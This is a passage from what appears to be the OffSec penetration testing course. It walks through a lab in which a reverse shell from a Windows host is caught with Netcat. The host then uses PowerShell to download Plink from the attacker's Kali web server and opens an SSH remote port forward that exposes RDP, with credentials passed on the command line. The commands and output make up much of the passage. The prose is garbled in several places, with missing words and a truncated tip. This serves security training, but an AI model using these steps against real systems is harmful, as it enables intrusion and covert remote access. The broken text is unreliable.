# OffSec Penetration Testing with Kali Linux

The shell quickly its listener.

```
listening on [any] 4446 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
Microsoft Windows [Version 10.0.28348.825]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

*Listing 570 - The file from nc.exe caught by our Netcat listener.*

We now want download Plink to MULTISERVER03. On our Kali machine, we can copy plink.exe from windows-resources/binaries to the Apache 2 web

```
kali@kali:~$ find -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe\nkali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali:
```

*Listing 571 - Copying plink.exe to our Apache 2 webroot.*

In our reverse, we'll use the PowerShell-one to download plink.exe from our Kali machine to C:\WindowsTemp

```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe
OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
c:\windows\system32\inetsrv>
```

*Listing 572 - Plink downloaded to the C:folder.*

With the executable downloaded to MULTISERVER03, we can consider using this:

In this case, we'll set up Plink with a remote port so that we can access the MULTISERVER03. The command syntax to set a remote port forward with Plink is very similar to the OpenSSH client remote port command. After the - R option, we'll pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.

We will also pass the username (-l) and password (-pw) directly on the command line.

> If we log our Kali somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only on our Kali machine for remote port forwarding

```
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD
HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389
192.168.118.4
```

The host key is not cached for this server:

PWK - © 2023 OffSec Services Limited. All rights reserved.

604